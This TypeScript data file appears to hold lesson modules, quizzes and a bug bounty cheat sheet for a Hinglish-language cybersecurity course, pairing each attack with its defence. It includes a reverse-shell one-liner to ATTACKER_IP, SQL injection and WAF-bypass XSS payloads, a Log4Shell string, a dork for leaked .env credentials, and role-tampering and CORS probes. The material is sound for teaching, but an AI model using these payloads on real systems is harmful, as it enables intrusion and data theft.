import { CyberModule, BugBountyTip } from '../types';

export const CYBER_MODULES: CyberModule[] = [
  // ========================================================
  // LEVEL 0: FOUNDATION & HACKER MINDSET
  // ========================================================
  {
    level: 0,
    levelBadge: 'Zero: Ground Zero',
    title: 'Hacker Mindset & Networking Basics',
    subtitle: 'Cybersecurity ka ABCD — IP, Ports, OSI Model & Linux',
    iconName: 'ShieldAlert',
    hinglishIntro:
      'Agar tum zero par ho to sabse pehle hacker banne ka dimaag aur internet ki anatomy samajhni hogi. Data hawa me nahi chalta, packets me daudta hai!',
    estimatedTime: '45 mins',
    topics: [
      {
        id: 'l0-t1',
        title: 'CIA Triad — Security Ka Geeta Saar',
        tagline: 'Confidentiality, Integrity, Availability',
        hinglishSummary:
          'Cybersecurity ka pura empire in 3 pillars par khada hai. Agar ek bhi gira, to system compromise ho gaya.',
        detailedPoints: [
          'Confidentiality (Secrecy): Sirf unhi ko data dikhna chahiye jinka haq hai (e.g., WhatsApp end-to-end encryption ya medical records).',
          'Integrity (Sachhai): Data raste me ya database me tamper (chhedchhaad) na ho (e.g., bank balance 500 se 500000 na ho sake).',
          'Availability (Milna): Jab legitimate user ko zarurat ho, tab server ya app on rehna chahiye (DDoS attack is availability ko gira deta hai).'
        ],
        keyTerms: [
          { term: 'Confidentiality', meaning: 'Sirf authorized insaan hi data padh sake' },
          { term: 'Integrity', meaning: 'Data me koi chori-chhupe badlaav na hua ho' },
          { term: 'Availability', meaning: 'Website 24x7 up aur chalne layak rahe' }
        ],
        realWorldAttackScenario:
          '2014 me Sony Pictures hack hua — attackers ne confidential emails leak kar diye (Loss of Confidentiality) aur saare servers wipe kar diye (Loss of Availability).',
        howToDefend:
          'Hamesha Multi-Factor Authentication (MFA), role-based permissions, aur database backup + disaster recovery plan rakho.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Check system users and groups to prevent privilege leaks\ncat /etc/passwd | cut -d: -f1\nwhoami && id',
          explanation: 'Linux me check karo current logged-in user kaun hai aur uske paas kya permissions hain.'
        }
      },
      {
        id: 'l0-t2',
        title: 'IP Address, MAC & Port Numbers',
        tagline: 'Internet ka Ghar ka Pata aur Darwaze',
        hinglishSummary:
          'IP address ghar ka address hai, aur Port number us ghar ke alag-alag kamre ya khidkiyan hain jahan specific services chalti hain.',
        detailedPoints: [
          'IP Address (IPv4: 192.168.1.1, IPv6: 2001:db8...): Internet par har device ka digital address.',
          'MAC Address (Physical Address): Hardware NIC card ka permanent address (e.g., 00:1A:2B:3C:4D:5E).',
          'Port Numbers (0 to 65535): Service ke darwaze. Port 80 = HTTP (Unsecured Web), Port 443 = HTTPS (Encrypted Web), Port 22 = SSH (Secure Shell), Port 21 = FTP, Port 53 = DNS.'
        ],
        keyTerms: [
          { term: 'Port 80', meaning: 'HTTP plain web traffic (attacker dekh sakta hai)' },
          { term: 'Port 443', meaning: 'HTTPS encrypted web traffic (SSL/TLS)' },
          { term: 'Port 22', meaning: 'SSH secure remote command line login' }
        ],
        realWorldAttackScenario:
          'Agar kisi college server par Port 21 (FTP) ya Port 23 (Telnet) khula reh jaye, to attacker bina password ya unencrypted passwords sniff karke pura control le sakta hai.',
        howToDefend:
          'Unnecessary ports ko UFW (Uncomplicated Firewall) ya iptables se block karo. Default ports ko change karo (e.g., SSH port 22 se 2222 par shift karo).',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Dekho aapke system par kaunse ports sun rahe hain (listening)\nnetstat -tuln\n# Ya modern ss command\nss -tulnp',
          explanation: 'Yeh command dikhati hai kaunsi application kaunse port par request sun rahi hai.'
        }
      },
      {
        id: 'l0-t3',
        title: 'Linux Terminal & Kali Linux Essentials',
        tagline: 'Hackers ka favorite weapon',
        hinglishSummary:
          'GUI (mouse click) se hacker nahi bana jaata. Saare top exploits aur pentesting tools command line par chalte hain.',
        detailedPoints: [
          'File Navigation: ls (list files), cd (change directory), pwd (current folder path).',
          'File Inspection: cat, head, tail, grep (pattern search jaise Ctrl+F terminal me).',
          'Permissions: chmod (change mode jaise chmod +x script.sh), chown (change owner).',
          'Superuser power: sudo (Superuser Do — root administrator commands).'
        ],
        keyTerms: [
          { term: 'Root User', meaning: 'Linux ka Bhagwan — iske paas sab delete karne aur modify karne ka haq hota hai' },
          { term: 'Grep', meaning: 'Hazaron lines ke logs me se specific IP ya error dhundne ka command' }
        ],
        realWorldAttackScenario:
          'Attacker jab target machine me reverse shell leta hai, to pehla kaam `whoami`, `uname -a`, aur `sudo -l` chala kar system privileges check karna hota hai.',
        howToDefend:
          'Kabhi bhi regular tasks ke liye root account se login mat karo. Hamesha standard user account with strict sudoers file use karo.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Ek hi line me useful hacker recon\nuname -a && whoami && hostname -I',
          explanation: 'OS kernel version, current user aur local IP address print karta hai.'
        }
      }
    ],
    quizzes: [
      {
        id: 'q0-1',
        question: 'HTTPS web traffic kaunse default port number par chalta hai?',
        options: ['Port 80', 'Port 443', 'Port 22', 'Port 8080'],
        correctIndex: 1,
        explanationInHinglish: 'Port 443 HTTPS (TLS/SSL encrypted) ke liye use hota hai, jabki Port 80 unencrypted HTTP hota hai.',
        difficulty: 'Easy'
      },
      {
        id: 'q0-2',
        question: 'CIA Triad me "I" ka matlab kya hota hai?',
        options: ['Intelligence', 'Integrity', 'Identification', 'Inspection'],
        correctIndex: 1,
        explanationInHinglish: 'Integrity ka matlab hai data ke sath kisi tarah ki chhedchhaad na hui ho aur data authentic rahe.',
        difficulty: 'Easy'
      }
    ]
  },

  // ========================================================
  // LEVEL 1: WEB APPLICATION SECURITY (OWASP TOP 10)
  // ========================================================
  {
    level: 1,
    levelBadge: 'Level 1: Web Pentester',
    title: 'OWASP Top 10 — Web Hacking & Defenses',
    subtitle: 'SQL Injection, XSS, CSRF, IDOR & Broken Auth',
    iconName: 'Globe',
    hinglishIntro:
      'Duniya ki 90% bugs web applications me milti hain. Bug bounty hunters inhi vulnerabilities se lakhon rupaye kamate hain!',
    estimatedTime: '1 hr 15 mins',
    topics: [
      {
        id: 'l1-t1',
        title: 'SQL Injection (SQLi) — Database Ka Tala Todna',
        tagline: "' OR 1=1 --",
        hinglishSummary:
          'Jab website user se input leti hai aur bina sanitize kiye sidha SQL query me jod deti hai, to attacker database dump karwa sakta hai.',
        detailedPoints: [
          'Kamzoori: Backend query: `SELECT * FROM users WHERE user = \'\' + input + \'\'`',
          'Exploit: User enter karta hai `admin\' OR \'1\'=\'1\' --`',
          'Asar: SQL condition hamesha True ho jaati hai aur bina password ke admin account login ho jata hai!',
          'Types: In-band SQLi (Error/Union based), Blind SQLi (Boolean/Time based).'
        ],
        keyTerms: [
          { term: 'SQL Injection', meaning: 'User input ke zariye database query ko todkar data churana' },
          { term: 'Prepared Statement', meaning: 'Input ko query ka part banane ke bajaye parameter treat karna (Permanent Fix)' }
        ],
        realWorldAttackScenario:
          '2011 me Sony PlayStation Network par SQLi hua tha jisme 77 million users ke account details aur credit card info leak ho gayi thi.',
        howToDefend:
          'Kabhi bhi raw string concatenation mat karo. Hamesha Parameterized Queries / Prepared Statements (e.g. `db.query("SELECT * WHERE id = ?", [id])`) ya modern ORM (Prisma, Drizzle) use karo.',
        commandOrCodeSnippet: {
          lang: 'sql',
          code: '-- Vulnerable query:\nSELECT * FROM accounts WHERE username = \'admin\' OR \'1\'=\'1\' --\' AND password = \'xxx\';\n\n-- Secure Prepared Statement (Node.js/Postgres):\nclient.query(\'SELECT * FROM accounts WHERE username = $1 AND password = $2\', [username, hash]);',
          explanation: 'Prepared statement me user input execute nahi hota balki sirf string value ki tarah bind hota hai.'
        }
      },
      {
        id: 'l1-t2',
        title: 'Cross-Site Scripting (XSS) — Browser Hijack',
        tagline: '<script>alert("Hacked")</script>',
        hinglishSummary:
          'Jab attacker kisi website par malicious JavaScript daal deta hai jo dusre innocent users ke browser me execute hokar unke session cookies chura leti hai.',
        detailedPoints: [
          'Stored XSS: Script database me store ho jaati hai (jaise comment section me). Jo bhi comment padhega, uska account hack!',
          'Reflected XSS: URL parameters ke through aati hai (e.g., search?q=<script>...). User link pe click karta hai aur script execute hoti hai.',
          'DOM-based XSS: Browser ke client-side JavaScript me data flow bina sanitize hue execute ho jata hai.'
        ],
        keyTerms: [
          { term: 'Cookie Stealing', meaning: 'document.cookie ko attacker ke server par bhejkar victim ka active session hijack karna' },
          { term: 'CSP (Content Security Policy)', meaning: 'Browser header jo batata hai kaunse domains se script chal sakti hai' }
        ],
        realWorldAttackScenario:
          'Samy Worm (MySpace XSS 2005) — Sirf 20 ghante me 1 million se zyada users ke profile me XSS payload spread ho gaya tha.',
        howToDefend:
          'User input ko HTML entities me encode karo (&lt;, &gt;, &quot;). Set `HttpOnly` flag on session cookies taaki JS unhe read na kar sake. Strong Content-Security-Policy header lagao.',
        commandOrCodeSnippet: {
          lang: 'javascript',
          code: '// Cookie protection in Express.js:\nres.cookie(\'session_token\', token, {\n  httpOnly: true, // JS cannot read document.cookie\n  secure: true,   // only sent over HTTPS\n  sameSite: \'strict\'\n});',
          explanation: 'HttpOnly flag lagane se XSS hone par bhi attacker session cookie chori nahi kar sakta.'
        }
      },
      {
        id: 'l1-t3',
        title: 'IDOR (Insecure Direct Object References)',
        tagline: 'URL me 101 ko 102 kar diya aur dusre ka data khul gaya!',
        hinglishSummary:
          'Bug bounty hunters ka sabse aasan aur pyara bug. Jab server check hi nahi karta ki request karne wala user is data ka asli maalik hai ya nahi.',
        detailedPoints: [
          'Vulnerability: URL hoti hai `/api/invoices/5001`. Attacker change karta hai `/api/invoices/5002` aur Dusre user ka invoice PDF download ho jata hai!',
          'Kyu hota hai: Developer ne sirf dekha ki user logged in hai, yeh check karna bhool gaya ki kya invoice #5002 is logged-in user ki company ka hai.'
        ],
        keyTerms: [
          { term: 'IDOR', meaning: 'Object ID badal kar kisi aur user ka private data dekhna ya delete karna' },
          { term: 'Authorization Check', meaning: 'Yeh verify karna ki kya user ko is resource ka access allowed hai' }
        ],
        realWorldAttackScenario:
          'Kayi mobile banking apps aur delivery apps me user profile update request me `user_id` badal kar dusre ka mobile number change karne ka bug report hua hai ($3000+ bounty).',
        howToDefend:
          'Hamesha session me se `req.user.id` lo, aur SQL query me `WHERE id = $id AND owner_id = $userId` enforce karo.',
        commandOrCodeSnippet: {
          lang: 'javascript',
          code: '// Flawed:\nconst order = await db.getOrder(req.params.id);\n\n// Secure:\nconst order = await db.getOrder({\n  id: req.params.id,\n  userId: req.session.userId // Strict ownership verification\n});',
          explanation: 'Always verify ownership on the server side using the authenticated session.'
        }
      }
    ],
    quizzes: [
      {
        id: 'q1-1',
        question: 'SQL Injection se permanent protection paane ka sabse best tareeka kya hai?',
        options: ['HTML strip tags', 'Prepared Statements (Parameterized queries)', 'Complex admin password', 'Port block karna'],
        correctIndex: 1,
        explanationInHinglish: 'Prepared Statements user input ko code execute hone se rokte hain aur direct parameter ki tarah pass karte hain.',
        difficulty: 'Medium'
      },
      {
        id: 'q1-2',
        question: 'Cookie par `HttpOnly` flag lagane se kis attack se bachav hota hai?',
        options: ['DDoS Attack', 'SQL Injection', 'XSS dwara Cookie Stealing', 'Port Scanning'],
        correctIndex: 2,
        explanationInHinglish: 'HttpOnly flag JS ke document.cookie access ko block karta hai, isliye XSS payload cookie chura nahi pata.',
        difficulty: 'Medium'
      }
    ]
  },

  // ========================================================
  // LEVEL 2: NETWORK RECONNAISSANCE & OSINT
  // ========================================================
  {
    level: 2,
    levelBadge: 'Level 2: Recon Hunter',
    title: 'Network Recon, Nmap & Wireshark',
    subtitle: 'Target ko scan karna, packets padhna aur footprints nikalna',
    iconName: 'Radio',
    hinglishIntro:
      'Hacking ka 70% waqt reconnaissance (information gathering) me jaata hai. Jisko jitna target ke baare me pata hota hai, uska attack utna deadly hota hai!',
    estimatedTime: '50 mins',
    topics: [
      {
        id: 'l2-t1',
        title: 'Nmap (Network Mapper) — Port Scanning Ka Baap',
        tagline: 'Target machine par kaunse darwaze khule hain?',
        hinglishSummary:
          'Nmap target IP par specially crafted packets bhejta hai aur unke reply se batata hai kaunse ports khule hain aur kaunse software versions chal rahe hain.',
        detailedPoints: [
          'SYN Stealth Scan (-sS): 3-way handshake pura nahi karta (SYN bhejta hai, SYN-ACK aate hi RST bhej deta hai). Logs me kam detect hota hai.',
          'Service Version Detection (-sV): Batata hai Apache 2.4.49 chal raha hai ya Nginx 1.18.',
          'OS Detection (-O): TCP window size aur TTL se guess karta hai Linux hai ya Windows.',
          'Aggressive Scan (-A): Version, OS, traceroute aur default scripts sab ek sath run karta hai.'
        ],
        keyTerms: [
          { term: 'SYN Scan (-sS)', meaning: 'Half-open stealth scan jo connection complete nahi karta' },
          { term: 'Banner Grabbing', meaning: 'Service ka exact version number pata karna taaki published CVE dhoonda ja sake' }
        ],
        realWorldAttackScenario:
          'Attacker ne scan kiya to dekha port 445 (SMB) open hai Windows 7 machine par. Usne sidha NSA ka EternalBlue exploit (MS17-010) daala aur target system hack kar liya (WannaCry ransomware method).',
        howToDefend:
          'Firewall me sirf zaruri ports kholo. Shodan par apni company ki IP search karo aur dekho duniya ko kya dikh raha hai.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Common Nmap commands:\nnmap -sS -sV -p 80,443,22,3306 192.168.1.10\n# Scan all 65535 ports fast\nnmap -p- -T4 target.com',
          explanation: '-sS stealth scan karta hai, -sV service ka exact version batata hai.'
        }
      },
      {
        id: 'l2-t2',
        title: 'Wireshark & Packet Sniffing',
        tagline: 'Network ke wire me se data ko nange aakhon se dekhna',
        hinglishSummary:
          'Jab do devices baat karte hain to packets switch/router se guzarte hain. Wireshark in packets ko capture karke ek ek byte decode karta hai.',
        detailedPoints: [
          'Promiscuous Mode: Network card ko sabhi packets sunne ki ijaazat deta hai.',
          'Plaintext Khatra: Agar traffic HTTP ya FTP hai, to Wireshark me sidha username aur password clear text me dikhta hai!',
          'Display Filters: `http.request.method == "POST"` ya `tcp.port == 443` ya `ip.addr == 192.168.1.5`.'
        ],
        keyTerms: [
          { term: 'Man-in-the-Middle (MITM)', meaning: 'Attacker router aur victim ke beech baith kar sara traffic intercept karta hai (ARP Spoofing)' },
          { term: 'PCAP File', meaning: 'Packet capture file jisme sara recorded network traffic store hota hai' }
        ],
        realWorldAttackScenario:
          'Free airport Wi-Fi par kisi ne bina VPN ke unencrypted HTTP website me login kiya. Pass me baithe attacker ne Wireshark se password capture kar liya.',
        howToDefend:
          'Hamesha HTTPS use karo. Public Wi-Fi par bina VPN ke internet mat chalao. Network switches par Dynamic ARP Inspection (DAI) lagao.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Terminal based packet capture (tcpdump):\nsudo tcpdump -i eth0 -n "port 80" -A',
          explanation: 'Port 80 ke traffic ke packets ko terminal me ASCII text me print karta hai.'
        }
      }
    ],
    quizzes: [
      {
        id: 'q2-1',
        question: 'Nmap me kaunsa flag service versions (e.g. Apache version) detect karne ke liye use hota hai?',
        options: ['-sS', '-sV', '-O', '-p-'],
        correctIndex: 1,
        explanationInHinglish: '-sV (Service Version) target services ke banner grab karke version identify karta hai.',
        difficulty: 'Easy'
      }
    ]
  },

  // ========================================================
  // LEVEL 3: CRYPTOGRAPHY & HASH CRACKING
  // ========================================================
  {
    level: 3,
    levelBadge: 'Level 3: Cryptanalyst',
    title: 'Cryptography, Hashes & Password Cracking',
    subtitle: 'Ciphers, RSA, AES, Hashcat & Rainbow Tables',
    iconName: 'Lock',
    hinglishIntro:
      'Encryption aur Hashing me farq samajhna cybersecurity ka core hai. Hashes one-way hote hain, par wordlist aur brute-force se crack kiye jaate hain!',
    estimatedTime: '1 hr',
    topics: [
      {
        id: 'l3-t1',
        title: 'Encryption vs Hashing vs Encoding',
        tagline: 'Sabse bada student confusion dur karo',
        hinglishSummary:
          'Encoding security nahi hai! Hashing one-way math hai! Encryption two-way secret key math hai!',
        detailedPoints: [
          'Encoding (Base64, URL encoding): Sirf format change hai taaki data transfer ho sake. Anyone can decode it (No security!).',
          'Hashing (MD5, SHA-256, bcrypt): One-way mathematical function. "password123" se hash banta hai, par hash se wapas original text nikalne ka koi math formula nahi hota.',
          'Encryption (AES-256, RSA): Two-way mechanism. Plaintext ko encrypt karne ke liye key chahiye, aur decrypt karne ke liye sahi key chahiye.'
        ],
        keyTerms: [
          { term: 'Salt', meaning: 'Password hash banane se pehle random characters jodna taaki rainbow table attack fail ho jaye' },
          { term: 'Bcrypt / Argon2', meaning: 'Slow hashing algorithms jo brute force attacks ko bohot mehenga/slow bana dete hain' }
        ],
        realWorldAttackScenario:
          'Adobe ka 2013 leak — Unhone passwords ko weak symmetric encryption se encrypt kiya tha aur hints bhi store ki thi. Attackers ne saare 150 million passwords decrypt kar liye.',
        howToDefend:
          'Kabhi bhi MD5 ya SHA-1 me password mat store karo. Hamesha bcrypt, scrypt, ya Argon2 with unique salt use karo.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Generate SHA-256 hash in Linux:\necho -n "admin123" | sha256sum\n# Output: 240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9',
          explanation: 'Chahe input kitna bhi lamba ho, SHA-256 hamesha 64 hex characters (256 bits) ka output deta hai.'
        }
      },
      {
        id: 'l3-t2',
        title: 'Hash Cracking & Hashcat Tool',
        tagline: 'Wordlists (RockYou.txt) se passwords todna',
        hinglishSummary:
          'Kyunki hash reverse nahi hota, isliye attackers dictionary ke laakhon words ka hash nikalte hain aur target hash se match karte hain!',
        detailedPoints: [
          'Dictionary Attack: RockYou.txt jaise list me 14 million leaked passwords hote hain.',
          'Rainbow Tables: Pre-calculated hashes ki tables jisme lookup instant hota hai.',
          'Hashcat: GPU (Graphics Card) ki taaqat se billions of hashes per second calculate karta hai.'
        ],
        keyTerms: [
          { term: 'RockYou.txt', meaning: 'Hacking world ki sabse mashhoor wordlist' },
          { term: 'Brute Force', meaning: 'A se Z tak saare combinations try karna' }
        ],
        realWorldAttackScenario:
          'Database dump leak hone par agar passwords bina salt ke MD5 me the, to Hashcat kuch hi seconds me 95% passwords nikal leta hai.',
        howToDefend:
          'Users ko minimum 12-16 characters ke complex passwords (passphrase) use karne ko kaho, aur high cost factor (rounds) wala bcrypt use karo.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Hashcat MD5 dictionary crack:\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt',
          explanation: '-m 0 specifies MD5 hash format, followed by target hash file and wordlist.'
        }
      }
    ],
    quizzes: [
      {
        id: 'q3-1',
        question: 'Base64 string (jaise "YWRtaW4=") kya security provide karta hai?',
        options: ['Military grade encryption', 'Zero security (sirf data format encoding hai)', 'One-way hashing', 'Quantum protection'],
        correctIndex: 1,
        explanationInHinglish: 'Base64 sirf encoding hai, koi bhi insaan ise bina kisi key ke 1 second me decode kar sakta hai.',
        difficulty: 'Easy'
      }
    ]
  },

  // ========================================================
  // LEVEL 4: ETHICAL HACKING & BUG BOUNTY HUNTING
  // ========================================================
  {
    level: 4,
    levelBadge: 'Level 4: Bug Bounty Pro',
    title: 'Exploitation, Reverse Shells & Bug Bounty',
    subtitle: 'Metasploit, Payloads, HackerOne & Responsible Disclosure',
    iconName: 'Terminal',
    hinglishIntro:
      'Ab aati hai asli hacking aur legal earning! Companiyan jaise Google, Meta, aur Swiggy security researchers ko bugs dhundne par $500 se $50,000 tak cash deti hain.',
    estimatedTime: '1 hr 30 mins',
    topics: [
      {
        id: 'l4-t1',
        title: 'Reverse Shell vs Bind Shell',
        tagline: 'Target computer ka remote terminal apne screen par lena',
        hinglishSummary:
          'Exploit run hone ke baad attacker ko target machine par command chalane ke liye shell connection chahiye hota hai.',
        detailedPoints: [
          'Bind Shell: Target machine ek port open karti hai (jaise port 4444) aur attacker usse connect hota hai. Lekin firewall ise block kar deta hai.',
          'Reverse Shell (Hacker’s Choice): Target machine khud attacker ke IP/Port par connection initiate karti hai (outbound traffic). Firewalls outbound traffic ko usually allow karte hain!',
          'Netcat Listener: Attacker apni machine par `nc -lvnp 4444` chala kar connection ka intezaar karta hai.'
        ],
        keyTerms: [
          { term: 'Payload', meaning: 'Wo code jo exploit ke baad target system par run hota hai' },
          { term: 'Listener', meaning: 'Attacker ki machine par open socket jo incoming reverse connection pakadta hai' }
        ],
        realWorldAttackScenario:
          'Log4j (Log4Shell CVE-2021-44228) exploit me bas ek chat message ya user-agent string me `${jndi:ldap:...}` bhejte hi remote server sidha attacker ko reverse shell de deta tha.',
        howToDefend:
          'Egress filtering lagao (servers ko bahar random ports par initiate connections allow mat karo). Unpatched libraries ko update karo.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Step 1: Attacker machine starts listener\nnc -lvnp 4444\n\n# Step 2: Target executes reverse bash shell\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
          explanation: 'Netcat listener inbound connection sunta hai aur target se bash pipe connect ho jata hai.'
        }
      },
      {
        id: 'l4-t2',
        title: 'Bug Bounty Methodology & Report Writing',
        tagline: 'Bug dhundne se zyada zaroori hai acche se report likhna',
        hinglishSummary:
          'Agar tum bug dhundh lo par sahi format me POC (Proof of Concept) na do, to triage team use close ya duplicate kar sakti hai.',
        detailedPoints: [
          'Subdomain Enumeration: Sublist3r, Amass, findomain se target ke hidden subdomains nikalo (jaise staging.target.com ya dev-api.target.com).',
          'Scope Check: Kabhi bhi "Out of Scope" domain par attack mat karo warna illegal maana jayega.',
          'Report Format: Title, Severity (CVSS score), Vulnerability Description, Step-by-Step Reproduction Steps, Impact, aur Recommended Mitigation.'
        ],
        keyTerms: [
          { term: 'Scope', meaning: 'Wo websites jinko target karne ki company ne written permission di hai' },
          { term: 'Duplicate (Dup)', meaning: 'Kisi aur ne wahi bug tumse 10 minute pehle submit kar diya to tumhe bounty nahi milegi' }
        ],
        realWorldAttackScenario:
          'Kayi hackers ne dekha ki company ka `forgot-password` endpoint rate-limited nahi tha. Brute-force karke 4-digit OTP tod kar account takeover kar liya aur $5000 bounty jeeti.',
        howToDefend:
          'Har sensitive endpoint par strict IP aur account based Rate Limiting lagao (e.g. max 5 OTP attempts in 15 minutes).',
        commandOrCodeSnippet: {
          lang: 'markdown',
          code: '# Standard Bug Report Template:\n**Title**: IDOR on /api/user/profile allows PII leakage\n**Severity**: High (CVSS 7.5)\n**Steps to Reproduce**:\n1. Login with User A\n2. Intercept GET /api/user/profile?id=101\n3. Change id to 102 and send\n4. User B full address and phone returned.',
          explanation: 'A clean reproduction step guarantees fast triage and payout.'
        }
      }
    ],
    quizzes: [
      {
        id: 'q4-1',
        question: 'Firewall ko bypass karne ke liye hackers bind shell ke bajaye reverse shell kyu prefer karte hain?',
        options: ['Kyunki firewalls outbound (bahar jane wale) connections ko aamtaur par allow karte hain', 'Reverse shell me password nahi lagta', 'Bind shell slow hota hai', 'Linux me bind shell chalta hi nahi'],
        correctIndex: 0,
        explanationInHinglish: 'Target machine khud bahar connection banati hai, jo ki firewall policies ke mutabik outgoing legitimate traffic lagta hai.',
        difficulty: 'Pro'
      }
    ]
  },

  // ========================================================
  // LEVEL 5: BLUE TEAM DEFENSE, SOC & HERO CERTIFICATION
  // ========================================================
  {
    level: 5,
    levelBadge: 'Level 5: Cyber Guardian',
    title: 'Blue Team Defense, SOC & Incident Response',
    subtitle: 'Firewalls, SIEM, Malware Analysis & Cyber Hero Certification',
    iconName: 'Award',
    hinglishIntro:
      'Hacking seekhna aasan hai, par enterprise level defense banana sabse badi kala hai. Yeh level tumhe ek certified Cyber Hero banata hai!',
    estimatedTime: '1 hr',
    topics: [
      {
        id: 'l5-t1',
        title: 'SOC (Security Operations Center) & SIEM',
        tagline: 'Company ka 24x7 Digital Police Station',
        hinglishSummary:
          'Har second hazaron servers log generate karte hain. SIEM (Splunk, Wazuh, Elastic) in sab logs ko ek jagah scan karke suspicious anomalies detect karta hai.',
        detailedPoints: [
          'Alert Triage: 1 minute me 50 failed SSH logins aaye? SIEM alert trigger karega (Brute Force detected!).',
          'Correlation Rules: Ek IP ne port scan kiya + web directory bruteforce ki + SQL payload bheja = Immediate IP ban!',
          'Incident Response (PICERL): Preparation -> Identification -> Containment -> Eradication -> Recovery -> Lessons Learned.'
        ],
        keyTerms: [
          { term: 'SIEM', meaning: 'Security Information and Event Management (Logs ka central brain)' },
          { term: 'Zero-Day', meaning: 'Aisi vulnerability jiska patch abhi company ne release nahi kiya hai' }
        ],
        realWorldAttackScenario:
          'SolarWinds Supply Chain Attack (2020) — Attacker software update file me malware inject karke chale gaye the. Months baad SOC analysts ne unusual network outbound traffic dekh kar pakda.',
        howToDefend:
          'Zero Trust Architecture implement karo ("Never Trust, Always Verify"). Endpoints par EDR (CrowdStrike/SentinelOne) deploy karo.',
        commandOrCodeSnippet: {
          lang: 'bash',
          code: '# Check failed SSH login attempts in Linux logs:\nsudo grep "Failed password" /var/log/auth.log | tail -n 20',
          explanation: 'Authentication logs me se failed attempts dekh kar brute-force IPs spot kiye jaate hain.'
        }
      }
    ],
    quizzes: [
      {
        id: 'q5-1',
        question: 'Incident Response ka sahi sequence kya hai?',
        options: [
          'Recovery -> Containment -> Eradication',
          'Identification -> Containment -> Eradication -> Recovery',
          'Eradication -> Identification -> Recovery',
          'Containment -> Preparation -> Eradication'
        ],
        correctIndex: 1,
        explanationInHinglish: 'PICERL model me pehle identify karte hain, fir containment (isolate system), fir virus eradicate karte hain, aur fir system recover karte hain.',
        difficulty: 'Pro'
      }
    ]
  }
];

export const BUG_BOUNTY_CHEAT_SHEET: BugBountyTip[] = [
  {
    id: 'bb-1',
    category: 'Google Dorking',
    title: 'Exposed Sensitive Files & Environment Variables',
    tipHinglish: 'Google par dork maar kar companiyon ki `.env` files ya backup database dhoondo.',
    dorkOrPayload: 'site:target.com ext:env OR ext:sql OR ext:bak "DB_PASSWORD"',
    bountyRange: '$500 - $2,500'
  },
  {
    id: 'bb-2',
    category: 'Authentication Bypass',
    title: 'Parameter Tampering (Role Manipulation)',
    tipHinglish: 'Register ya update profile API me `{"role": "user"}` ko badal kar `{"role": "admin"}` bhej kar dekho.',
    dorkOrPayload: 'POST /api/user/update {"isAdmin": true, "role": "superadmin"}',
    bountyRange: '$1,000 - $5,000'
  },
  {
    id: 'bb-3',
    category: 'XSS Payloads',
    title: 'WAF Bypass SVG Vector',
    tipHinglish: 'Kayi WAFs `<script>` ko block karte hain, par SVG onload ko miss kar dete hain.',
    dorkOrPayload: '<svg onload=alert(document.domain)>',
    bountyRange: '$300 - $1,500'
  },
  {
    id: 'bb-4',
    category: 'CORS Misconfiguration',
    title: 'Origin Reflection with Credentials',
    tipHinglish: 'Request me `Origin: evil.com` bhejo; agar response me `Access-Control-Allow-Origin: evil.com` aur `Allow-Credentials: true` aaye to pura account data read ho sakta hai!',
    dorkOrPayload: 'Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true',
    bountyRange: '$1,000 - $4,000'
  }
];
